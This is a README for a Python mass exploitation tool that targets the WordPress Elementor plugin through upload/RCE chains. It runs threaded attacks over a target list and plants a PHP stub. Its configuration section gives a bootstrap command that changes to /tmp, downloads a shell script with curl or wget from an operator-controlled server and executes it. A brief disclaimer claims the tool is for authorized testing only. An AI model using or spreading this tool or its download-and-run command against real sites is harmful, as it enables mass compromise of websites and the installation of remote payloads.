# elementor

Python mass scanner/exploit for **WordPress Elementor** plugin upload/RCE chains. Threaded queue over a target list; drops a PHP stub that runs a shell bootstrap.

## File

- `exploit.py`

## Configuration

Edit before run:

```python
DOM = "URDOM"   # your lab server hosting el.sh
```

Bootstrap command template: `cd /tmp; curl/wget el.sh; sh s elementor`

## Usage

```bash
python3 exploit.py <targets.txt>
```

See script `argparse` / `main` block for threads and input format.

## Requirements

Python 3, `urllib`, SSL verification disabled for self-signed lab sites.

## Disclaimer

Authorized WordPress instances you own or are contracted to test only.
